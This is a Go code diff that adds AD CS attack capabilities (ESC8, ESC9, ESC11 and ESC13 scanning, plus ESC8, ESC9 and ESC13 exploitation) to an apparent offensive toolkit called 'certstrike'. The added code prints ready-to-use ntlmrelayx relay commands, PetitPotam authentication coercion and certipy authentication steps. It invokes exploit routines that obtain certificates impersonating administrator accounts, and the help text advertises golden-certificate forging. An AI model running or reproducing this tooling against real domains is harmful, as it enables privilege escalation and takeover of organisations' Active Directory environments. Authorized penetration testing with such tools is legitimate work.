@@ -17,13 +17,16 @@ import (
 var pkiCmd = &cobra.Command{
 	Use:   "pki",
 	Short: "Advanced Certificate/PKI attack toolkit",
-	Long: `ADCS enumeration (ESC1-ESC8), golden certificate forging, ESC exploitation, and mTLS interception.
+	Long: `ADCS enumeration (ESC1-ESC11, ESC13), golden certificate forging, ESC exploitation, and mTLS interception.
 
 Examples:
   certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass
   certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
   certstrike pki --exploit esc1 --template VulnTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
   certstrike pki --exploit esc4 --template WritableTemplate --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
+  certstrike pki --exploit esc8 --template Machine --upn admin@domain.com --target-dc dc01.corp.local --domain corp.local
+  certstrike pki --exploit esc9 --template NoSecExtTemplate --upn admin@domain.com --attacker-dn CN=attacker,CN=Users,DC=corp,DC=local --target-dc dc01.corp.local --domain corp.local
+  certstrike pki --exploit esc13 --template LinkedPolicyTemplate --upn user@domain.com --target-dc dc01.corp.local --domain corp.local
   certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		doEnum, _ := cmd.Flags().GetBool("enum")
@@ -112,6 +115,89 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    DN:      %s\n", f.CADN)
 			fmt.Printf("    Trustee: %s\n", f.Trustee)
 			fmt.Printf("    Rights:  %s  (mask=0x%08x)\n", strings.Join(f.Rights, ", "), f.AccessMask)
+			fmt.Println()
+		}
+	}
+
+	// ESC8: NTLM relay to AD CS web enrollment
+	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
+	esc8Findings, err := pki.ScanESC8(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC8 scan failed: %v\n", err)
+	} else if len(esc8Findings) == 0 {
+		fmt.Println("[+] ESC8: No vulnerable web enrollment endpoints found.")
+	} else {
+		fmt.Printf("\n[!] ESC8 VULNERABLE — %d finding(s):\n\n", len(esc8Findings))
+		for _, f := range esc8Findings {
+			fmt.Printf("    CA:        %s\n", f.CAName)
+			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
+			fmt.Printf("    Endpoint:  %s\n", f.HTTPEndpoint)
+			fmt.Printf("    NTLM:      %v\n", f.NTLMEnabled)
+			fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
+			fmt.Printf("    Exploit:   ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template <TEMPLATE>\n", f.HTTPEndpoint)
+			fmt.Println()
+		}
+	}
+
+	// ESC11: NTLM relay to AD CS RPC interface
+	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
+	esc11Findings, err := pki.ScanESC11(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC11 scan failed: %v\n", err)
+	} else if len(esc11Findings) == 0 {
+		fmt.Println("[+] ESC11: All CAs enforce RPC encryption.")
+	} else {
+		fmt.Printf("\n[!] ESC11 VULNERABLE — %d finding(s):\n\n", len(esc11Findings))
+		for _, f := range esc11Findings {
+			fmt.Printf("    CA:        %s\n", f.CAName)
+			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
+			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
+			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
+			fmt.Printf("    Exploit:   ntlmrelayx.py -t rpc://%s -rpc-mode ICPR -icpr-ca-name %q -smb2support\n", f.CAHostname, f.CAName)
+			fmt.Println()
+		}
+	}
+
+	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
+	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
+	esc9Findings, err := pki.ScanESC9(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC9 scan failed: %v\n", err)
+	} else if len(esc9Findings) == 0 {
+		fmt.Println("[+] ESC9: No vulnerable templates found.")
+	} else {
+		fmt.Printf("\n[!] ESC9 VULNERABLE — %d finding(s):\n\n", len(esc9Findings))
+		for _, f := range esc9Findings {
+			enforcement := "unknown"
+			switch f.BindingEnforcement {
+			case 0:
+				enforcement = "Disabled (EXPLOITABLE)"
+			case 1:
+				enforcement = "Compatibility mode (EXPLOITABLE)"
+			case 2:
+				enforcement = "Full enforcement (mitigated)"
+			}
+			fmt.Printf("    Template:                %s\n", f.TemplateName)
+			fmt.Printf("    NO_SECURITY_EXTENSION:   %v\n", f.HasNoSecurityExtension)
+			fmt.Printf("    Authentication EKU:      %v\n", f.AuthenticationEKU)
+			fmt.Printf("    Binding Enforcement:     %d (%s)\n", f.BindingEnforcement, enforcement)
+			fmt.Println()
+		}
+	}
+
+	// ESC13: OID group link abuse via msDS-OIDToGroupLink
+	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
+	esc13Findings, err := pki.ScanESC13(cfg)
+	if err != nil {
+		fmt.Printf("[!] ESC13 scan failed: %v\n", err)
+	} else if len(esc13Findings) == 0 {
+		fmt.Println("[+] ESC13: No linked issuance policy OIDs found.")
+	} else {
+		fmt.Printf("\n[!] ESC13 VULNERABLE — %d finding(s):\n\n", len(esc13Findings))
+		for _, f := range esc13Findings {
+			fmt.Printf("    Template:     %s\n", f.TemplateName)
+			fmt.Printf("    Policy OID:   %s\n", f.IssuancePolicyOID)
+			fmt.Printf("    Linked Group: %s (%s)\n", f.LinkedGroupName, f.LinkedGroup)
 			fmt.Println()
 		}
 	}
@@ -218,8 +304,34 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
 	case "esc4":
 		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
+	case "esc9":
+		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
+		if attackerDN == "" {
+			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
+		}
+		cert, certKey, err = pki.ExploitESC9(cfg, templateName, attackerDN, upn)
+	case "esc13":
+		cert, certKey, err = pki.ExploitESC13(cfg, templateName, upn)
+	case "esc8":
+		// ESC8 is a relay attack — scan for the endpoint and print the ntlmrelayx command
+		esc8Findings, scanErr := pki.ScanESC8(cfg)
+		if scanErr != nil {
+			return fmt.Errorf("ESC8 scan failed: %w", scanErr)
+		}
+		if len(esc8Findings) == 0 {
+			return fmt.Errorf("no vulnerable web enrollment endpoints found")
+		}
+		fmt.Println("\n[!] ESC8 relay attack — use ntlmrelayx to relay coerced NTLM auth:")
+		for _, f := range esc8Findings {
+			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
+			fmt.Printf("    ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s\n", f.HTTPEndpoint, templateName)
+			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
+		}
+		fmt.Println("\n[*] After obtaining the certificate via relay:")
+		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
+		return nil
 	default:
-		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4)", exploit)
+		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4, esc8, esc9, esc13)", exploit)
 	}
 
 	if err != nil {
@@ -284,7 +396,7 @@ func init() {
 
 	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
 	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
-	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4)")
+	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4, esc8, esc9, esc13)")
 	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
 	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
 	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
@@ -297,4 +409,5 @@ func init() {
 	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
 	pkiCmd.Flags().Bool("tls", false, "Use LDAPS (port 636) instead of LDAP (port 389)")
 	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
+	pkiCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN for ESC9 exploitation (e.g., CN=attacker,CN=Users,DC=corp,DC=local)")
 }
